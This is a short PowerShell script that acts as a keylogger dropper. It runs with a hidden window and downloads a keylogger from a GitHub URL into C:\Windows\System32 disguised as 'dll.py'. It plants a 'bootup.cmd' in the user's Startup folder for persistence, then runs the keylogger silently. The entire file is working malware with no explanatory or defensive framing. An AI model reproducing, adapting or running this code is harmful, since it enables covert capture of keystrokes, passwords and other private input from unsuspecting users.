powershell -WindowStyle hidden
$username = $env:UserName
$filedest = 'C:\Users\' + $username + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bootup.cmd'
$dest = "C:\Windows\System32\dll.py"
$bol1 = Test-Path -Path $dest
$bol2 = Test-Path -Path $filedest

if (-Not $bol1){
  Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/keylogger.py" -Outfile $dest
}
if (-Not $bol2){
  Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -Outfile $filedest
}
  
powershell -WindowStyle hidden python C:\Windows\System32\dll.py
